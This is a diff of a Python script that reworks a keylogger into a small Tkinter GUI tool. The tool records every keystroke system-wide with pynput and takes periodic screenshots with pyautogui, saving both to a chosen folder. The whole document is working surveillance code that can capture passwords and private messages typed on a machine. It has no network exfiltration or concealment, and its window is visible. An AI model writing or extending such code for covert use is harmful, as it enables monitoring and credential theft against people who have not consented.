@@ -1,24 +1,20 @@
+import tkinter as tk
+from tkinter import filedialog, messagebox
 from pynput.keyboard import Key, Listener
 import pyautogui
 import threading
+import logging
 import time
 import os
-import logging
 from datetime import datetime
 
-# === Timestamped Folder Setup ===
-timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-folder_name = f"logs_{timestamp}"
-os.makedirs(folder_name, exist_ok=True)
-
-# === Logging Setup ===
-log_file_path = os.path.join(folder_name, "keystrokes.txt")
-logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# === Stop Flag ===
+# === Global variables ===
 stop_event = threading.Event()
+key_thread = None
+screenshot_thread = None
+folder_name = ""
 
-# === Keystroke Logging Function ===
+# === Logging Functionality ===
 def press_key(key):
     try:
         logging.info(str(key))
@@ -27,15 +23,14 @@ def press_key(key):
 
 def release_key(key):
     if key == Key.esc:
-        stop_event.set()  # Signal to stop
-        return False      # Stop keylogger
+        stop_event.set()
+        return False
 
 def keylogger():
     with Listener(on_press=press_key, on_release=release_key) as listener:
         listener.join()
 
-# === Screenshot Capture Function ===
-def screenshot_capture(interval=10):  # Take screenshot every 10 seconds
+def screenshot_capture(interval):
     count = 0
     while not stop_event.is_set():
         screenshot = pyautogui.screenshot()
@@ -44,16 +39,55 @@ def screenshot_capture(interval=10):  # Take screenshot every 10 seconds
         count += 1
         time.sleep(interval)
 
-# === Threading Setup ===
-t1 = threading.Thread(target=keylogger)
-t2 = threading.Thread(target=screenshot_capture)
+# === GUI Handlers ===
+def start_logging():
+    global key_thread, screenshot_thread, folder_name
 
-print("Started Keylogger with Screenshot Capture... (Press ESC to stop)")
-t1.start()
-t2.start()
+    try:
+        interval = int(interval_entry.get())
+    except ValueError:
+        messagebox.showerror("Invalid Input", "Screenshot interval must be an integer.")
+        return
 
-# Wait for both threads to finish
-t1.join()
-t2.join()
+    output_dir = filedialog.askdirectory(title="Select Output Folder")
+    if not output_dir:
+        return
 
-print("Keylogger and Screenshot capture stopped.")
+    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+    folder_name = os.path.join(output_dir, f"logs_{timestamp}")
+    os.makedirs(folder_name, exist_ok=True)
+
+    log_path = os.path.join(folder_name, "keystrokes.txt")
+    logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    stop_event.clear()
+    key_thread = threading.Thread(target=keylogger)
+    screenshot_thread = threading.Thread(target=screenshot_capture, args=(interval,))
+
+    key_thread.start()
+    screenshot_thread.start()
+
+    status_label.config(text="✅ Logging started. Press ESC to stop.", fg="green")
+
+def stop_logging():
+    stop_event.set()
+    status_label.config(text="🛑 Logging stopped.", fg="red")
+
+# === GUI Setup ===
+window = tk.Tk()
+window.title("Keylogger with Screenshot Capture")
+window.geometry("400x250")
+window.resizable(False, False)
+
+tk.Label(window, text="Screenshot Interval (seconds):").pack(pady=10)
+interval_entry = tk.Entry(window)
+interval_entry.pack()
+interval_entry.insert(0, "10")  # Default value
+
+tk.Button(window, text="Start Logging", command=start_logging, bg="#4CAF50", fg="white").pack(pady=10)
+tk.Button(window, text="Stop Logging", command=stop_logging, bg="#f44336", fg="white").pack()
+
+status_label = tk.Label(window, text="Idle", fg="gray")
+status_label.pack(pady=20)
+
+window.mainloop()
